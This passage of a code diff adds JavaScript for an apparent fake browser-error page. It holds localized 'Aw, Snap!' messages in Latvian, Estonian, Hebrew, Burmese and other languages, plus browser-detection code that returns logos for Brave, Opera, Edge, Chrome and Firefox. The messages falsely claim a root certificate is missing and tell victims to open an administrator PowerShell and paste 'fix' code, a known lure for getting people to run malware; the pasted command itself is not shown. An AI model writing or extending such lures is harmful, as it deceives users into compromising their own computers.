+      openVideo: "Atidaryti vaizdo instrukcijas",
+      copyTheCodeText: "Kopijuoti kodą",
+    },
+    lv: {
+      title: "Opera",
+      message1: "<b>Aw, Snap!</b> Parādot šo tīmekļa lapu, radās kļūda.",
+      message2:
+        "Lai pareizi skatītu šo tīmekļa lapu, instalējiet galveno sertifikātu. Noklikšķiniet uz pogas 'Salabot' un izpildiet papildu norādījumus.",
+      steps: [
+        "Ar peles labo pogu noklikšķiniet uz Sākt izvēlnes un palaidiet 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Ar peles labo pogu noklikšķiniet konsoles loga iekšpusē.",
+      ],
+      copyButton: "Kopēt labojumu",
+      reloadButton: "Atsvaidzināt lapu",
+      howToFix: "Kā labot",
+      waitOperation:
+        "Pagaidiet, līdz operācija tiks pabeigta, pēc tam atsvaidziniet lapu.",
+      openVideo: "Atvērt video instrukcijas",
+      copyTheCodeText: "Kopēt kodu",
+    },
+    et: {
+      title: "Opera",
+      message1: "<b>Aw, Snap!</b> Selle veebilehe kuvamisel ilmnes probleem.",
+      message2:
+        "Selle veebilehe õigeks kuvamiseks installige põhisertifikaat. Klõpsake nuppu 'Paranda' ja järgige edasisi juhiseid.",
+      steps: [
+        "Paremklõpsake Start-menüü peal ja käivitage 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Paremklõpsake konsooli akna sees.",
+      ],
+      copyButton: "Kopeeri parandus",
+      reloadButton: "Värskenda lehte",
+      howToFix: "Kuidas parandada",
+      waitOperation:
+        "Oodake, kuni operatsioon on lõpetatud, ja värskendage seejärel lehte.",
+      openVideo: "Ava videojuhis",
+      copyTheCodeText: "Kopeeri kood",
+    },
+    sl: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Pri prikazovanju te spletne strani je prišlo do napake.",
+      message2:
+        "Za pravilno prikazovanje te spletne strani namestite glavno potrdilo. Kliknite gumb 'Popravi' in sledite nadaljnjim navodilom.",
+      steps: [
+        "Z desno miškino tipko kliknite na meni Start in zaženite 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Z desno miškino tipko kliknite znotraj okna konzole.",
+      ],
+      copyButton: "Kopiraj popravek",
+      reloadButton: "Osveži stran",
+      howToFix: "Kako popraviti",
+      waitOperation:
+        "Počakajte, da se operacija zaključi, nato osvežite stran.",
+      openVideo: "Odpri video navodila",
+      copyTheCodeText: "Kopiraj kodo",
+    },
+    sr: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Došlo je do greške prilikom prikazivanja ove veb stranice.",
+      message2:
+        "Za pravilno prikazivanje ove veb stranice instalirajte glavni sertifikat. Kliknite na dugme 'Popravi' i pratite dalje upute.",
+      steps: [
+        "Desnim tasterom miša kliknite na meni Start i pokrenite 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Desnim tasterom miša kliknite unutar prozora konzole.",
+      ],
+      copyButton: "Kopiraj popravku",
+      reloadButton: "Osveži stranicu",
+      howToFix: "Kako popraviti",
+      waitOperation:
+        "Sačekajte da se operacija završi, a zatim osvežite stranicu.",
+      openVideo: "Otvori video uputstvo",
+      copyTheCodeText: "Kopiraj kod",
+    },
+    mk: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Се случи грешка при прикажување на оваа веб-страница.",
+      message2:
+        "За правилно прикажување на оваа веб-страница инсталирајте го основниот сертификат. Кликнете на копчето 'Поправи' и следете ги понатамошните упатства.",
+      steps: [
+        "Кликнете со десното копче на Почетното мени и стартувајте 'Windows Power Shell Admin' ('Windows Terminal').",
+        "Кликнете со десното копче внатре во прозорецот на конзолата.",
+      ],
+      copyButton: "Копирај поправка",
+      reloadButton: "Освежи ја страницата",
+      howToFix: "Како да се поправи",
+      waitOperation:
+        "Почекајте додека операцијата не заврши, потоа освежете ја страницата.",
+      openVideo: "Отвори видео инструкции",
+      copyTheCodeText: "Копирај го кодот",
+    },
+    az: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> Bu veb səhifəsini göstərərkən bir problem meydana gəldi.",
+      message2:
+        "Bu veb səhifəni düzgün göstərmək üçün əsas sertifikatı quraşdırın. 'Düzəlt' düyməsini basın və əlavə göstərişlərə əməl edin.",
+      steps: [
+        "Başlanğıc menyusuna sağ vurun və 'Windows Power Shell Admin' ('Windows Terminal') işə salın.",
+        "Konsol pəncərəsinin içində sağ vurun.",
+      ],
+      copyButton: "Təmir nüsxəsini çıxarın",
+      reloadButton: "Səhifəni yeniləyin",
+      howToFix: "Necə düzəltmək olar",
+      waitOperation:
+        "Əməliyyat tamamlanana qədər gözləyin, sonra səhifəni yeniləyin.",
+      openVideo: "Video təlimatı açın",
+      copyTheCodeText: "Kodu kopyalayın",
+    },
+
+    he: {
+      title: "Opera",
+      message1: "<b>Aw, Snap!</b> אירעה שגיאה במהלך הצגת דף האינטרנט הזה.",
+      message2:
+        "כדי להציג את דף האינטרנט הזה בצורה נכונה, התקינו את אישור הבסיס. לחצו על הכפתור 'תקן' ופעלו לפי ההוראות הנוספות.",
+      steps: [
+        "לחצו לחיצה ימנית על לחצן ההתחלה והפעילו 'Windows Power Shell Admin' ('Windows Terminal').",
+        "לחצו לחיצה ימנית בחלון הקונסולה הפתוח.",
+      ],
+      copyButton: "העתק תיקון",
+      reloadButton: "רענן דף",
+      howToFix: "כיצד לתקן",
+      waitOperation: "המתינו לסיום הפעולה ואז רעננו את הדף.",
+      openVideo: "פתחו את הוראות הווידאו",
+      copyTheCodeText: "העתיקו את הקוד",
+    },
+
+    tl: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> May nangyaring mali habang ipinapakita ang web page na ito.",
+      message2:
+        "Upang maipakita nang tama ang pahinang ito, mangyaring i-install ang root certificate. I-click ang 'Ayusin' at sundin ang mga karagdagang tagubilin.",
+      steps: [
+        "I-right click ang Start button at patakbuhin ang 'Windows Power Shell Admin' ('Windows Terminal').",
+        "I-right click sa loob ng open console window.",
+      ],
+      copyButton: "Kopyahin ang pag-aayos",
+      reloadButton: "I-refresh ang pahina",
+      howToFix: "Paano ayusin",
+      waitOperation:
+        "Hintayin ang pag-aayos matapos at pagkatapos ay i-refresh ang pahina.",
+      openVideo: "Buksan ang video na mga tagubilin",
+      copyTheCodeText: "Kopyahin ang code",
+    },
+
+    my: {
+      title: "Opera",
+      message1:
+        "<b>Aw, Snap!</b> ဤဝဘ်စာမျက်နှာကိုပြသတဲ့အခါ အမှားတစ်ခုဖြစ်ပွားခဲ့သည်။",
+      message2:
+        "ဤဝဘ်စာမျက်နှာကိုမှန်ကန်စွာပြရန် root လက်မှတ်ကိုထည့်သွင်းပါ။ 'ပြင်ဆင်ခြင်း' ခလုတ်ကိုနှိပ်ပြီးနောက်ထပ်ညွှန်ကြားချက်များကိုလိုက်နာပါ။",
+      steps: [
+        "Start ခလုတ်ပေါ်ကိုညာဘက်ကလစ်နှိပ်ပြီး 'Windows Power Shell Admin' ('Windows Terminal') ကိုဆောင်ပါ။",
+        "ဖွင့်ထားသော console window တွင်ညာဘက်ကလစ်နှိပ်ပါ။",
+      ],
+      copyButton: "ပြင်ဆင်မှုကိုကူးယူမည်",
+      reloadButton: "စာမျက်နှာကိုပြန်လည်ဖြစ်စေပါ",
+      howToFix: "ပြင်ဆင်ရန်အညွှန်း",
+      waitOperation:
+        "ပြင်ဆင်မှုပြီးဆုံးရန်စောင့်ပြီးနောက်စာမျက်နှာကိုပြန်လည်ဖြစ်စေပါ။",
+      openVideo: "ဗီဒီယိုညွှန်ကြားချက်များကိုဖွင့်ပါ",
+      copyTheCodeText: "ကုဒ်ကိုကူးယူပါ",
+    },
+  };
+
+  function getUserLanguage() {
+    return navigator.language || navigator.userLanguage;
+  }
+  function getSimpleBrowserName() {
+    const userAgent = navigator.userAgent;
+    if (navigator.brave) {
+      return [
+        "Brave",
+        '<svg viewBox="0 0 256 301" style="width:100%; height:100%" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid"><defs><linearGradient x1="0%" y1="50.017894%" x2="100.096998%" y2="50.017894%" id="linearGradient-1"><stop stop-color="#FFFFFF" offset="0%"></stop><stop stop-color="#FFFFFF" stop-opacity="0.9576" offset="14.13%"></stop><stop stop-color="#FFFFFF" stop-opacity="0.7" offset="100%"></stop></linearGradient><linearGradient x1="-0.0390588235%" y1="49.9824538%" x2="100%" y2="49.9824538%" id="linearGradient-2"><stop stop-color="#F1F1F2" offset="0%"></stop><stop stop-color="#E4E5E6" offset="9.191442%"></stop><stop stop-color="#D9DADB" offset="23.57%"></stop><stop stop-color="#D2D4D5" offset="43.8%"></stop><stop stop-color="#D0D2D3" offset="100%"></stop></linearGradient></defs><g><path d="M256,97.1 L246.7,72 L253.1,57.6 C253.9,55.7 253.5,53.6 252.1,52.1 L234.6,34.4 C226.9,26.7 215.5,24 205.2,27.6 L200.3,29.3 L173.5,0.3 L128.2,0 L127.9,0 L82.3,0.4 L55.6,29.6 L50.8,27.9 C40.4,24.2 28.9,26.9 21.2,34.8 L3.4,52.8 C2.2,54 1.9,55.7 2.5,57.2 L9.2,72.2 L0,97.3 L6,120 L33.2,223.3 C36.3,235.2 43.5,245.6 53.6,252.8 C53.6,252.8 86.6,276.1 119.1,297.2 C122,299.1 125,300.4 128.2,300.4 C131.4,300.4 134.4,299.1 137.3,297.2 C173.9,273.2 202.8,252.7 202.8,252.7 C212.8,245.5 220,235.1 223.1,223.2 L250.1,119.9 L256,97.1 Z" fill="#F15A22"></path><path d="M34.5,227.7 L0,99.5 L10.1,74.4 L3.1,55.8 L19.8,38.8 C25.3,33.9 36.1,32.2 41.1,35.1 L67.2,50.1 L101.2,58 L127.7,47 L129.9,274.7 C129.5,307.5 131.6,304 107.5,288.5 L48,248.6 C41.6,242.5 36.7,235.6 34.5,227.7 Z" fill="url(#linearGradient-1)" opacity="0.15" style="mix-blend-mode: lighten;"></path><path d="M202.2,252.245742 L151.6,286.845742 C137.5,294.545742 130.7,302.145742 129.6,298.445742 C128.7,295.545742 129.4,287.045742 129.1,273.845742 L128.5,51.1457423 C128.6,48.9457423 130.1,45.2457423 132.7,45.6457423 L158.5,53.4457423 L195.7,47.6457423 L220.3,29.5457423 C222.9,27.5457423 226.7,27.7457423 229.1,30.0457423 L251.1,51.0457423 C253.1,53.1457423 253.2,57.2457423 252,59.8457423 L245.9,71.1457423 L256,97.2457423 L221.2,226.645742 C215.8,242.745742 208.2,246.945742 202.2,252.245742 Z" fill="url(#linearGradient-2)" opacity="0.4" style="mix-blend-mode: darken;"></path><path d="M134,184.801367 C132.8,184.301367 131.5,183.901367 131.1,183.901367 L129.5,183.901367 L127.9,183.901367 C127.5,183.901367 126.2,184.301367 125,184.801367 L112,190.201367 C110.8,190.701367 108.8,191.601367 107.6,192.201367 L88,202.401367 C86.8,203.001367 86.7,204.101367 87.8,204.901367 L105.1,217.101367 C106.2,217.901367 107.9,219.201367 108.9,220.101367 L116.6,226.701367 C117.6,227.601367 119.2,229.001367 120.2,229.901367 L127.6,236.501367 C128.6,237.401367 130.2,237.401367 131.2,236.501367 L138.8,229.901367 C139.8,229.001367 141.4,227.601367 142.4,226.701367 L150.1,220.001367 C151.1,219.101367 152.8,217.801367 153.9,217.001367 L171.2,204.701367 C172.3,203.901367 172.2,202.801367 171,202.201367 L151.4,192.201367 C150.2,191.601367 148.2,190.701367 147,190.201367 L134,184.801367 Z" fill="#FFFFFF"></path><path d="M227.813299,101.557129 C228.213299,100.257129 228.213299,99.7571289 228.213299,99.7571289 C228.213299,98.4571289 228.113299,96.2571289 227.913299,94.9571289 L226.913299,92.0571289 C226.313299,90.8571289 225.313299,88.9571289 224.513299,87.8571289 L213.213299,71.1571289 C212.513299,70.0571289 211.213299,68.3571289 210.313299,67.2571289 L195.713299,48.9571289 C194.913299,47.9571289 194.113299,47.0571289 194.013299,47.1571289 L193.813299,47.1571289 C193.813299,47.1571289 192.713299,47.3571289 191.413299,47.5571289 L169.113299,51.9571289 C167.813299,52.2571289 165.713299,52.6571289 164.413299,52.8571289 L164.013299,52.9571289 C162.713299,53.1571289 160.613299,53.0571289 159.313299,52.6571289 L140.613299,46.6571289 C139.313299,46.2571289 137.213299,45.6571289 136.013299,45.3571289 C136.013299,45.3571289 132.213299,44.4571289 129.113299,44.5571289 C126.013299,44.5571289 122.213299,45.3571289 122.213299,45.3571289 C120.913299,45.6571289 118.813299,46.2571289 117.613299,46.6571289 L98.9132993,52.6571289 C97.6132993,53.0571289 95.5132993,53.1571289 94.2132993,52.9571289 L93.8132993,52.8571289 C92.5132993,52.6571289 90.4132993,52.1571289 89.1132993,51.9571289 L66.6132993,47.7571289 C65.3132993,47.4571289 64.2132993,47.3571289 64.2132993,47.3571289 L64.0132993,47.3571289 C63.9132993,47.3571289 63.1132993,48.1571289 62.3132993,49.1571289 L47.7132993,67.4571289 C46.9132993,68.4571289 45.6132993,70.2571289 44.8132993,71.3571289 L33.5132993,88.0571289 C32.8132993,89.1571289 31.7132993,91.0571289 31.1132993,92.2571289 L30.1132993,95.1571289 C29.9132993,96.4571289 29.7132993,98.6571289 29.8132993,99.9571289 C29.8132993,99.9571289 29.8132993,100.357129 30.2132993,101.757129 C30.9132993,104.157129 32.6132993,106.357129 32.6132993,106.357129 C33.4132993,107.357129 34.9132993,109.057129 35.8132993,109.957129 L68.9132993,145.157129 C69.8132993,146.157129 70.1132993,147.957129 69.6132993,149.157129 L62.7132993,165.457129 C62.2132993,166.657129 62.1132993,168.657129 62.6132993,169.957129 L64.5132993,175.057129 C66.1132993,179.357129 68.8132993,183.157129 72.4132993,186.057129 L79.1132993,191.457129 C80.1132993,192.257129 81.9132993,192.557129 83.1132993,191.957129 L104.313299,181.857129 C105.513299,181.257129 107.313299,180.057129 108.313299,179.157129 L123.513299,165.457129 C125.713299,163.457129 125.813299,160.057129 123.813299,157.857129 L91.9132993,136.357129 C90.8132993,135.657129 90.4132993,134.057129 91.0132993,132.857129 L105.013299,106.457129 C105.613299,105.257129 105.713299,103.357129 105.213299,102.157129 L103.513299,98.2571289 C103.013299,97.0571289 101.513299,95.6571289 100.313299,95.1571289 L59.2132993,79.7571289 C58.0132993,79.2571289 58.0132993,78.7571289 59.3132993,78.6571289 L85.8132993,76.1571289 C87.1132993,76.0571289 89.2132993,76.2571289 90.5132993,76.5571289 L114.113299,83.1571289 C115.413299,83.5571289 116.213299,84.8571289 116.013299,86.1571289 L107.813299,131.057129 C107.613299,132.357129 107.613299,134.157129 107.913299,135.157129 C108.213299,136.157129 109.513299,137.057129 110.813299,137.357129 L127.213299,140.857129 C128.513299,141.157129 130.613299,141.157129 131.913299,140.857129 L147.213299,137.357129 C148.513299,137.057129 149.813299,136.057129 150.113299,135.157129 C150.413299,134.257129 150.513299,132.357129 150.213299,131.057129 L142.113299,86.1571289 C141.913299,84.8571289 142.713299,83.4571289 144.013299,83.1571289 L167.613299,76.5571289 C168.913299,76.1571289 171.013299,76.0571289 172.313299,76.1571289 L198.813299,78.6571289 C200.113299,78.7571289 200.213299,79.2571289 198.913299,79.7571289 L157.813299,95.3571289 C156.613299,95.8571289 155.113299,97.1571289 154.613299,98.4571289 L152.913299,102.357129 C152.413299,103.557129 152.413299,105.557129 153.113299,106.657129 L167.213299,133.057129 C167.813299,134.257129 167.413299,135.757129 166.313299,136.557129 L134.413299,158.157129 C132.313299,160.257129 132.513299,163.757129 134.713299,165.757129 L149.913299,179.457129 C150.913299,180.357129 152.713299,181.557129 153.913299,182.057129 L175.213299,192.157129 C176.413299,192.757129 178.213299,192.457129 179.213299,191.657129 L185.913299,186.157129 C189.513299,183.257129 192.213299,179.457129 193.713299,175.157129 L195.613299,170.057129 C196.113299,168.857129 196.013299,166.757129 195.513299,165.557129 L188.613299,149.257129 C188.113299,148.057129 188.413299,146.257129 189.313299,145.257129 L222.413299,110.057129 C223.313299,109.057129 224.713299,107.457129 225.613299,106.457129 C225.413299,106.157129 227.213299,103.957129 227.813299,101.557129 Z" fill="#FFFFFF"></path></g></svg>',
+      ];
+    }
+    if (/Opera|OPR/.test(userAgent)) {
+      return [
+        "Opera",
+        '<svg xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 512 512" style="width:100%; height:100%;"><g><linearGradient id="a" x1="213.312" x2="213.312" y1="8.348" y2="504.55" gradientUnits="userSpaceOnUse"><stop offset=".3" style="stop-color:#FF1B2D" stop-color="#ff1b2d"></stop><stop offset=".438" style="stop-color:#FA1A2C" stop-color="#fa1a2c"></stop><stop offset=".594" style="stop-color:#ED1528" stop-color="#ed1528"></stop><stop offset=".758" style="stop-color:#D60E21" stop-color="#d60e21"></stop><stop offset=".927" style="stop-color:#B70519" stop-color="#b70519"></stop><stop offset="1" style="stop-color:#A70014" stop-color="#a70014"></stop></linearGradient><path d="M171.737 400.271c-28.302-33.411-46.637-82.808-47.882-138.238-.004-.143-.004-11.918 0-12.061 1.245-55.429 19.579-104.825 47.88-138.235 36.728-47.692 91.843-66.439 152.807-66.439 37.504 0 102.081 19.869 102.081 19.869C381.558 24.848 322.138.253 256.968.012c-.323-.001-.644-.012-.967-.012-141.385 0-256 114.615-256 256.001 0 137.295 108.085 249.338 243.808 255.704 4.042.19 8.104.297 12.192.297 65.542 0 125.317-24.642 170.604-65.151 0 0-62.116 14.14-99.614 14.14-60.965-.001-118.528-13.03-155.254-60.72z" style="fill:url(#a);" fill=""></path><linearGradient id="b" x1="341.868" x2="341.868" y1="37.594" y2="476.46" gradientUnits="userSpaceOnUse"><stop offset="0" style="stop-color:#9C0000" stop-color="#9c0000"></stop><stop offset=".7" style="stop-color:#FF4B4B" stop-color="#ff4b4b"></stop></linearGradient><path d="M171.735 111.737c23.489-27.729 53.836-44.453 86.982-44.453 74.523 0 134.936 84.493 134.936 188.719S333.24 444.721 258.717 444.721c-33.145 0-63.492-16.724-86.98-44.451 36.726 47.69 91.319 77.93 152.283 77.93 37.498 0 72.581-11.448 102.585-31.351 52.404-46.876 85.396-115.005 85.396-190.849 0-75.836-32.984-143.958-85.378-190.834-30.008-19.91-65.099-31.362-102.603-31.362-60.964.001-115.558 30.242-152.285 77.933z" style="fill:url(#b);" fill=""></path></g></svg>',
+      ];
+    } else if (/Edg/.test(userAgent)) {
+      return [
+        "Edge",
+        '<svg xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 512 512" style="width:100%; height:100%;"><g><linearGradient id="a" x1="120.572" x2="474.916" y1="351.939" y2="351.939" gradientUnits="userSpaceOnUse"><stop offset="0" style="stop-color:#00376F" stop-color="#00376f"></stop><stop offset="1" style="stop-color:#004E99" stop-color="#004e99"></stop></linearGradient><path d="M314.933 505.421c66.624-15.41 123.285-56.83 158.723-112.986 4.324-6.852-3.301-15.047-10.441-11.216-27.244 14.615-59.578 23.083-94.262 23.083-96.132 0-174.251-65.027-175.862-145.758-.544-27.28 15.737-51.398 39.363-61.48l-.016-.011c-13.967 4.889-29.673 6.91-41.82 15.331-46.071 31.936-74.038 91.028-69.583 144.152 4.324 51.55 35.847 111.958 90.373 138.946 28.515 14.113 65.299 11.816 103.525 9.939z" style="fill:url(#a);" fill=""></path><linearGradient id="b" x1="105.724" x2="402.175" y1="90.282" y2="265.648" gradientUnits="userSpaceOnUse"><stop offset="0" style="stop-color:#00C2DD" stop-color="#00c2dd"></stop><stop offset="1" style="stop-color:#00D34F" stop-color="#00d34f"></stop></linearGradient><path d="M312.618 333.416c17.271 6.302 36.319 9.795 56.335 9.795 78.436 0 142.02-53.612 142.022-119.745C510.975 92.357 388.69 1.185 259.396.012 118.43-1.269 2.319 112.649 1.035 253.615c0 0 35.268-108.92 161.25-108.92 85.246 0 144.847 50.601 154.637 88.852a63.814 63.814 0 0 1 4.06 22.453c0 16.57-6.302 31.668-16.639 43.029-10.242 11.256-6.022 29.17 8.275 34.387z" style="fill:url(#b);" fill=""></path><linearGradient id="c" x1="133.488" x2="213.342" y1="141.756" y2="508.144" gradientUnits="userSpaceOnUse"><stop offset=".002" style="stop-color:#006393" stop-color="#006393"></stop><stop offset=".4" style="stop-color:#0086DE" stop-color="#0086de"></stop><stop offset="1" style="stop-color:#006393" stop-color="#006393"></stop></linearGradient><path d="M316.922 233.547c-9.789-38.251-42.391-111.963-148.293-111.963-162.84 0-167.594 132.031-167.594 132.031C-.262 396.094 114.845 512 257.024 512c19.917 0 39.301-2.276 57.909-6.579-206.514 10.141-227.724-257.532-82.494-308.368l.016.011a62.35 62.35 0 0 1 23.873-5.018c27.721-.295 51.424 17.051 60.594 41.501z" style="fill:url(#c);" fill=""></path></g></svg>',
+      ];
+    } else if (/Chrome/.test(userAgent)) {
+      return [
+        "Chrome",
+        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 512 512" style="width:100%; height:100%;"><g><path d="M155.217 314.173 256 139.621l18.717.321 30.593 1.179 102.195 35.376 76.571-36.876C441.7 56.74 355.477 0 256 0 165.638 0 86.216 46.821 40.657 117.523v.172l7.746 131.034 106.814 65.444z" fill="#db4437"></path><path d="M155.217 314.173 40.657 117.695l-.053-.091C14.911 157.509 0 205.012 0 256c0 137.319 108.12 249.374 243.873 255.707l91.484-60.672 21.407-136.828-201.547-.034z" fill="#0f9d58"></path><path d="M484.076 139.621H256l100.783 174.552-.019.034-112.891 197.5.089.003c3.991.185 8.002.29 12.039.29 141.385 0 256-114.615 256-256-.001-41.908-10.073-81.463-27.925-116.379z" fill="#ffcd40"></path><circle cx="256" cy="256" r="116.379" fill="#f1f1f1"></circle><circle cx="256" cy="256" r="93.103" fill="#4285f4"></circle></g></svg>',
+      ];
+    } else if (/Firefox/.test(userAgent)) {
+      return [
+        "Firefox",
+        '<svg xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 512 512" style="width:100%; height:100%;"><g><linearGradient id="a" x1="-678.691" x2="-679.495" y1="6127.485" y2="6126.684" gradientTransform="matrix(480.0036 0 0 -495.9987 326214.75 3039304)" gradientUnits="userSpaceOnUse"><stop offset=".05" style="stop-color:#FFF339" stop-color="#fff339"></stop><stop offset=".37" style="stop-color:#FF9800" stop-color="#ff9800"></stop><stop offset=".53" style="stop-color:#FF3346" stop-color="#ff3346"></stop><stop offset=".7" style="stop-color:#FF0D8A" stop-color="#ff0d8a"></stop></linearGradient><path d="M485.903 171.728c-10.782-25.935-32.619-53.934-49.767-62.783 13.956 27.36 22.034 54.806 25.12 75.289 0 .04.016.14.049.413-28.052-69.918-75.617-98.111-114.458-159.498-1.961-3.104-3.928-6.216-5.844-9.497a75.873 75.873 0 0 1-2.731-5.132 45.134 45.134 0 0 1-3.709-9.813.647.647 0 0 0-.564-.665.84.84 0 0 0-.466 0c-.035.012-.087.053-.124.067-.055.022-.429.244-.412.224-62.318 36.497-83.125 103.75-85.068 137.529a124.13 124.13 0 0 0-68.276 26.31 73.714 73.714 0 0 0-6.426-4.852 114.934 114.934 0 0 1-.696-60.627c-25.484 11.604-45.306 29.946-59.716 46.142h-.115c-9.834-12.456-9.141-53.546-8.58-62.125-.118-.532-7.336 3.747-8.282 4.392a180.692 180.692 0 0 0-24.244 20.769 217.21 217.21 0 0 0-23.166 27.781c0 .012-.007.027-.011.039 0-.013.007-.027.011-.039a209.376 209.376 0 0 0-33.287 75.154c-.119.538-.219 1.095-.334 1.637-.467 2.184-2.147 13.11-2.441 15.484-.023.183-.033.358-.055.541a236.46 236.46 0 0 0-4.026 34.227c0 .423-.026.842-.026 1.267.006 136.995 111.077 248.048 248.083 248.048 122.7 0 224.579-89.072 244.524-206.07.42-3.175.757-6.367 1.127-9.57 4.931-42.54-.547-87.252-16.09-124.642zM199.972 365.89c1.16.554 2.25 1.16 3.442 1.692.05.034.118.072.168.103a127.536 127.536 0 0 1-3.61-1.795zm261.352-181.182-.033-.241c.012.088.028.18.041.267l-.008-.026z" style="fill:url(#a);" fill=""></path><radialGradient id="b" cx="-678.333" cy="6130.64" r="1.321" gradientTransform="matrix(384.0014 0 0 -390.468 260923.64 2393927.75)" gradientUnits="userSpaceOnUse"><stop offset=".13" style="stop-color:#FFBD44" stop-color="#ffbd44"></stop><stop offset=".28" style="stop-color:#FF9800" stop-color="#ff9800"></stop><stop offset=".47" style="stop-color:#FF3450" stop-color="#ff3450"></stop><stop offset=".78" style="stop-color:#FF027B" stop-color="#ff027b"></stop><stop offset=".86" style="stop-color:#FF0083" stop-color="#ff0083"></stop></radialGradient><path d="M485.903 171.728c-10.782-25.935-32.619-53.934-49.767-62.783 13.956 27.36 22.034 54.806 25.12 75.289 0-.06.011.05.037.233.012.088.028.18.041.267 23.406 63.453 10.655 127.978-7.72 167.407-28.427 61.007-97.254 123.531-204.982 120.481-116.393-3.295-218.932-89.657-238.073-202.77-3.488-17.837 0-26.894 1.755-41.377-2.138 11.165-2.952 14.39-4.026 34.227 0 .423-.026.842-.026 1.267.003 136.988 111.074 248.041 248.08 248.041 122.7 0 224.579-89.072 244.524-206.07.42-3.175.757-6.367 1.127-9.57 4.931-42.54-.547-87.252-16.09-124.642z" style="fill:url(#b);" fill=""></path><radialGradient id="c" cx="-678.775" cy="6130.098" r="1.321" gradientTransform="matrix(393.6014 0 0 -390.468 267417.781 2393877.5)" gradientUnits="userSpaceOnUse"><stop offset=".3" style="stop-color:#AF0611" stop-color="#af0611"></stop><stop offset=".35" style="stop-color:#CE1223;stop-opacity:0.74" stop-color="#ce1223;stop-opacity:0.74"></stop><stop offset=".43" style="stop-color:#FD243B;stop-opacity:0.34" stop-color="#fd243b;stop-opacity:0.34"></stop><stop offset=".5" style="stop-color:#FF304B;stop-opacity:0.09" stop-color="#ff304b;stop-opacity:0.09"></stop><stop offset=".53" style="stop-color:#FF3450;stop-opacity:0" stop-color="#ff3450;stop-opacity:0"></stop></radialGradient><path d="M485.903 171.728c-10.782-25.935-32.619-53.934-49.767-62.783 13.956 27.36 22.034 54.806 25.12 75.289 0-.06.011.05.037.233.012.088.028.18.041.267 23.406 63.453 10.655 127.978-7.72 167.407-28.427 61.007-97.254 123.531-204.982 120.481-116.393-3.295-218.932-89.657-238.073-202.77-3.488-17.837 0-26.894 1.755-41.377-2.138 11.165-2.952 14.39-4.026 34.227 0 .423-.026.842-.026 1.267.003 136.988 111.074 248.041 248.08 248.041 122.7 0 224.579-89.072 244.524-206.07.42-3.175.757-6.367 1.127-9.57 4.931-42.54-.547-87.252-16.09-124.642z" style="fill:url(#c);" fill=""></path><radialGradient id="d" cx="-674.593" cy="6144.096" r="1.445" gradientTransform="matrix(115.236 0 0 -195.642 78042.39 1202019.375)" gradientUnits="userSpaceOnUse"><stop offset=".13" style="stop-color:#FFF339" stop-color="#fff339"></stop><stop offset=".53" style="stop-color:#FF9800" stop-color="#ff9800"></stop></radialGradient><path d="M365.346 200.886c.541.38 1.032.758 1.541 1.135a134.915 134.915 0 0 0-23.03-30.051C266.743 94.865 333.043.322 333.061.302c-62.318 36.497-83.184 103.778-85.127 137.556 2.89-.2 5.773-.443 8.714-.443 46.504.001 87.008 25.57 108.698 63.471z" style="fill:url(#d);" fill=""></path><radialGradient id="e" cx="-677.586" cy="6138.399" r="1.032" gradientTransform="matrix(213.483 0 0 -233.9799 144848.297 1436665.5)" gradientUnits="userSpaceOnUse"><stop offset=".35" style="stop-color:#008EE9" stop-color="#008ee9"></stop><stop offset=".67" style="stop-color:#A059FF" stop-color="#a059ff"></stop><stop offset="1" style="stop-color:#DF36EA" stop-color="#df36ea"></stop></radialGradient><path d="M256.804 216.282c-.406 6.171-22.208 27.451-29.832 27.451-70.544 0-81.995 42.669-81.995 42.669 3.125 35.933 28.14 65.523 58.437 81.18 1.382.714 2.781 1.359 4.181 1.997 2.4 1.063 4.83 2.056 7.287 2.979a110.197 110.197 0 0 0 32.28 6.226c123.644 5.799 147.599-147.814 58.369-192.422 22.851-3.974 46.57 5.216 59.816 14.521-21.69-37.898-62.194-63.468-108.697-63.468-2.942 0-5.823.243-8.714.443a124.13 124.13 0 0 0-68.276 26.31c3.782 3.2 8.052 7.478 17.047 16.339 16.828 16.585 60.005 33.76 60.097 35.775z" style="fill:url(#e);" fill=""></path><radialGradient id="f" cx="-676.932" cy="6139.196" r=".609" gradientTransform="matrix(192.1347 0 0 -233.9799 130310.273 1436665.5)" gradientUnits="userSpaceOnUse"><stop offset=".21" style="stop-color:#A059FF;stop-opacity:0" stop-color="#a059ff;stop-opacity:0"></stop><stop offset=".97" style="stop-color:#80008E;stop-opacity:0.6" stop-color="#80008e;stop-opacity:0.6"></stop></radialGradient><path d="M256.804 216.282c-.406 6.171-22.208 27.451-29.832 27.451-70.544 0-81.995 42.669-81.995 42.669 3.125 35.933 28.14 65.523 58.437 81.18 1.382.714 2.781 1.359 4.181 1.997 2.4 1.063 4.83 2.056 7.287 2.979a110.197 110.197 0 0 0 32.28 6.226c123.644 5.799 147.599-147.814 58.369-192.422 22.851-3.974 46.57 5.216 59.816 14.521-21.69-37.898-62.194-63.468-108.697-63.468-2.942 0-5.823.243-8.714.443a124.13 124.13 0 0 0-68.276 26.31c3.782 3.2 8.052 7.478 17.047 16.339 16.828 16.585 60.005 33.76 60.097 35.775z" style="fill:url(#f);" fill=""></path><radialGradient id="g" cx="-667.268" cy="6207.806" r="2.994" gradientTransform="matrix(58.524 0 0 -58.732 39290.89 364634.906)" gradientUnits="userSpaceOnUse"><stop offset=".1" style="stop-color:#FFE200" stop-color="#ffe200"></stop><stop offset=".79" style="stop-color:#FF7232" stop-color="#ff7232"></stop></radialGradient><path d="M168.088 155.917a255.436 255.436 0 0 1 5.142 3.406 114.934 114.934 0 0 